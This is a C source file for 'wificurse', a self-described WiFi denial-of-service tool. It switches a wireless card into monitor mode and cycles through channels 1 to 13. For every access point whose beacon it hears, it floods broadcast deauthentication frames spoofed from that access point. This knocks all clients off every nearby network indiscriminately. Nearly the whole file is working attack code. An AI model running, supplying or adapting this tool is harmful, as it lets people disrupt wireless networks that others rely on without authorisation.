/*
    wificurse - WiFi DoS tool
    Copyright (C) <2012>  <oblique>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <poll.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <linux/wireless.h>
#include "error.h"
#include "wificurse.h"


void init_dev(struct dev *dev) {
	memset(dev, 0, sizeof(*dev));
	dev->fd = -1;
}

/* man 7 netdevice
 * man 7 packet
 */
int iw_open(struct dev *dev) {
	struct ifreq ifr;
	struct iwreq iwr;
	struct sockaddr_ll sll;
	struct packet_mreq mreq;
	int fd;

	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (fd < 0)
		return_error("socket");
	dev->fd = fd;

	/* save current interface flags */
	memset(&dev->old_flags, 0, sizeof(dev->old_flags));
	strncpy(dev->old_flags.ifr_name, dev->ifname, sizeof(dev->old_flags.ifr_name)-1);
	if (ioctl(fd, SIOCGIFFLAGS, &dev->old_flags) < 0)
		return_error("ioctl(SIOCGIFFLAGS)");

	/* save current interface mode */
	memset(&dev->old_mode, 0, sizeof(dev->old_mode));
	strncpy(dev->old_mode.ifr_name, dev->ifname, sizeof(dev->old_mode.ifr_name)-1);
	if (ioctl(fd, SIOCGIWMODE, &dev->old_mode) < 0)
		return_error("ioctl(SIOCGIWMODE)");

	/* set interface down (ifr_flags = 0) */
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, dev->ifname, sizeof(ifr.ifr_name)-1);
	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
		return_error("ioctl(SIOCSIFFLAGS)");

	/* set monitor mode */
	memset(&iwr, 0, sizeof(iwr));
	strncpy(iwr.ifr_name, dev->ifname, sizeof(iwr.ifr_name)-1);
	iwr.u.mode = IW_MODE_MONITOR;
	if (ioctl(fd, SIOCSIWMODE, &iwr) < 0)
		return_error("ioctl(SIOCSIWMODE)");

	/* set interface up, broadcast and running */
	ifr.ifr_flags = IFF_UP | IFF_BROADCAST | IFF_RUNNING;
	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
		return_error("ioctl(SIOCSIFFLAGS)");

	/* get interface index */
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		return_error("ioctl(SIOCGIFINDEX)");
	dev->ifindex = ifr.ifr_ifindex;

	/* bind interface to socket */
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = dev->ifindex;
	sll.sll_protocol = htons(ETH_P_ALL);
	if (bind(fd, (struct sockaddr*)&sll, sizeof(sll)) < 0)
		return_error("bind(%s)", dev->ifname);

	/* enable promiscuous mode */
	memset(&mreq, 0, sizeof(mreq));
	mreq.mr_ifindex = dev->ifindex;
	mreq.mr_type = PACKET_MR_PROMISC;
	if (setsockopt(fd, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mreq, sizeof(mreq)) < 0)
		return_error("setsockopt(PACKET_MR_PROMISC)");

	return 0;
}

void iw_close(struct dev *dev) {
	struct ifreq ifr;

	if (dev->fd == -1)
		return;

	/* set interface down (ifr_flags = 0) */
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, dev->ifname, sizeof(ifr.ifr_name)-1);
	ioctl(dev->fd, SIOCSIFFLAGS, &ifr);
	/* restore old mode */
	ioctl(dev->fd, SIOCSIWMODE, &dev->old_mode);
	/* restore old flags */
	ioctl(dev->fd, SIOCSIFFLAGS, &dev->old_flags);
	close(dev->fd);
}

ssize_t iw_write(int fd, void *buf, size_t count) {
	unsigned char *pbuf, *pkt;
	struct radiotap_hdr *rt_hdr;
	struct write_radiotap_data *w_rt_data;
	ssize_t r;

	pbuf = malloc(sizeof(*rt_hdr) + sizeof(*w_rt_data) + count);
	if (pbuf == NULL)
		return_error("malloc");

	rt_hdr = (struct radiotap_hdr*)pbuf;
	w_rt_data = (struct write_radiotap_data*)(pbuf + sizeof(*rt_hdr));
	pkt = pbuf + sizeof(*rt_hdr) + sizeof(*w_rt_data);

	/* radiotap header */
	memset(rt_hdr, 0, sizeof(*rt_hdr));
	rt_hdr->len = sizeof(*rt_hdr) + sizeof(*w_rt_data);
	rt_hdr->present = RADIOTAP_F_PRESENT_RATE | RADIOTAP_F_PRESENT_TX_FLAGS;
	/* radiotap fields */
	memset(w_rt_data, 0, sizeof(*w_rt_data));
	w_rt_data->rate = 2; /* 1 Mb/s */
	w_rt_data->tx_flags = RADIOTAP_F_TX_FLAGS_NOACK | RADIOTAP_F_TX_FLAGS_NOSEQ;
	/* packet */
	memcpy(pkt, buf, count);

	r = send(fd, pbuf, rt_hdr->len + count, 0);
	if (r < 0) {
		free(pbuf);
		return_error("send");
	}

	free(pbuf);
	return r - rt_hdr->len;
}

ssize_t iw_read(int fd, void *buf, size_t count, uint8_t **pkt, size_t *pkt_sz) {
	struct radiotap_hdr *rt_hdr;
	int r;

	/* read packet */
	r = recv(fd, buf, count, 0);
	if (r < 0)
		return_error("recv");

	rt_hdr = buf;
	if (sizeof(*rt_hdr) >= r || rt_hdr->len >= r)
		return -EAGAIN;

	*pkt = buf + rt_hdr->len;
	*pkt_sz = r - rt_hdr->len;

	return r;
}

int iw_set_channel(struct dev *dev, int chan) {
	struct iwreq iwr;
	int rcvbuflen, old_rcvbuflen;
	socklen_t optlen;

	/* save current receive buffer size */
	optlen = sizeof(old_rcvbuflen);
	if (getsockopt(dev->fd, SOL_SOCKET, SO_RCVBUF, &old_rcvbuflen, &optlen) < 0)
		return_error("getsockopt(SO_RCVBUF)");

	/* set receive buffer size to 0 */
	/* this will discard packets that are in kernel packet queue */
	rcvbuflen = 0;
	if (setsockopt(dev->fd, SOL_SOCKET, SO_RCVBUF, &rcvbuflen, optlen) < 0)
		return_error("setsockopt(SO_RCVBUF)");

	/* set channel */
	memset(&iwr, 0, sizeof(iwr));
	strncpy(iwr.ifr_name, dev->ifname, sizeof(iwr.ifr_name)-1);
	iwr.u.freq.flags = IW_FREQ_FIXED;
	iwr.u.freq.m = chan;
	if (ioctl(dev->fd, SIOCSIWFREQ, &iwr) < 0)
		return_error("ioctl(SIOCSIWFREQ)");
	dev->chan = chan;

	/* restore receive buffer size */
	if (setsockopt(dev->fd, SOL_SOCKET, SO_RCVBUF, &old_rcvbuflen, optlen) < 0)
		return_error("setsockopt(SO_RCVBUF)");

	return 0;
}

int send_deauth(int fd, unsigned char *ap_mac) {
	struct mgmt_frame *deauth;
	uint16_t *reason;
	int i;

	deauth = malloc(sizeof(*deauth) + sizeof(*reason));
	if (deauth == NULL)
		return_error("malloc");

	memset(deauth, 0, sizeof(deauth));
	deauth->fc.subtype = FRAME_CONTROL_SUBTYPE_DEAUTH;
	/* broadcast mac (ff:ff:ff:ff:ff:ff) */
	memset(deauth->dest_mac, '\xff', IFHWADDRLEN);
	memcpy(deauth->src_mac, ap_mac, IFHWADDRLEN);
	memcpy(deauth->bssid, ap_mac, IFHWADDRLEN);
	reason = (uint16_t*)&deauth->frame_body;
	/* reason 7: Class 3 frame received from nonassociated STA */
	*reason = htons(7);

	/* flood the network */
	for (i=0; i<128; i++) {
		deauth->sc.sequence = i;
		if (iw_write(fd, deauth, sizeof(*deauth) + sizeof(*reason)) < 0) {
			free(deauth);
			return GOTERR;
		}
		usleep(1000);
	}

	free(deauth);

	return 0;
}

int read_bssid(int fd, uint8_t *bssid) {
	uint8_t buf[256], *pkt;
	size_t pkt_sz;
	ssize_t r;
	struct mgmt_frame *beacon;

	r = iw_read(fd, buf, sizeof(buf), &pkt, &pkt_sz);
	if (r == -EAGAIN)
		return -EAGAIN;
	else if (r < 0)
		return GOTERR;

	beacon = (struct mgmt_frame*)pkt;

	/* if it's a beacon packet */
	if (beacon->fc.subtype == FRAME_CONTROL_SUBTYPE_BEACON) {
		memcpy(bssid, beacon->bssid, IFHWADDRLEN);
		return 0;
	}

	return -EAGAIN;
}

void print_mac(uint8_t *mac) {
	int i;

	for (i=0; i<5; i++)
		printf("%02x:", mac[i]);
	printf("%02x", mac[i]);
}


int main(int argc, char *argv[]) {
	struct dev dev;
	uint8_t bssid[IFHWADDRLEN];
	sigset_t exit_sig;
	struct pollfd pfd[2];
	time_t tm1;
	int chan, ret, sigfd;

	if (argc != 2) {
		fprintf(stderr, "usage: wificurse <interface>\n");
		return EXIT_FAILURE;
	}

	if (getuid()) {
		fprintf(stderr, "Not root?\n");
		return EXIT_FAILURE;
	}


	/* init signals */
	sigemptyset(&exit_sig);
	sigaddset(&exit_sig, SIGINT);
	sigaddset(&exit_sig, SIGTERM);

	if (sigprocmask(SIG_BLOCK, &exit_sig, NULL) < 0) {
		err_msg("sigprocmask");
		return EXIT_FAILURE;
	}

	sigfd = signalfd(-1, &exit_sig, 0);
	if (sigfd < 0) {
		err_msg("signalfd");
		return EXIT_FAILURE;
	}

	pfd[0].fd = sigfd;
	pfd[0].revents = 0;
	pfd[0].events = POLLIN;

	/* init device */
	init_dev(&dev);
	strncpy(dev.ifname, argv[1], sizeof(dev.ifname)-1);

	if (iw_open(&dev) < 0) {
		print_error();
		goto _errout;
	}

	pfd[1].fd = dev.fd;
	pfd[1].revents = 0;
	pfd[1].events = POLLIN;

	tm1 = time(NULL);
	chan = 1;

	if (iw_set_channel(&dev, chan) < 0) {
		print_error();
		goto _errout;
	}
	printf("Channel: %d\n", dev.chan);

	while (1) {
		if (poll(pfd, 2, 0) < 0) {
			err_msg("poll");
			goto _errout;
		}

		if (pfd[0].revents & POLLIN) /* got SIGTERM or SIGINT */
			break;

		if (pfd[1].revents & POLLIN) {
			ret = read_bssid(dev.fd, bssid);
			if (ret == -EAGAIN) /* no bssid */
				continue;
			else if (ret < 0) { /* error */
				print_error();
				goto _errout;
			} else { /* got BSSID */
				printf("DoS BSSID ");
				print_mac(bssid);
				printf("\n");
				if (send_deauth(dev.fd, bssid) < 0) {
					print_error();
					goto _errout;
				}
			}
		}

		/* change channel every 3 seconds */
		if (time(NULL) - tm1 >= 3) {
			chan = (chan % 13) + 1;
			if (iw_set_channel(&dev, chan) < 0) {
				print_error();
				goto _errout;
			}
			printf("Channel: %d\n", dev.chan);
			tm1 = time(NULL);
		}

	}

	printf("\nExiting..\n");
	iw_close(&dev);
	return EXIT_SUCCESS;
_errout:
	iw_close(&dev);
	return EXIT_FAILURE;
}
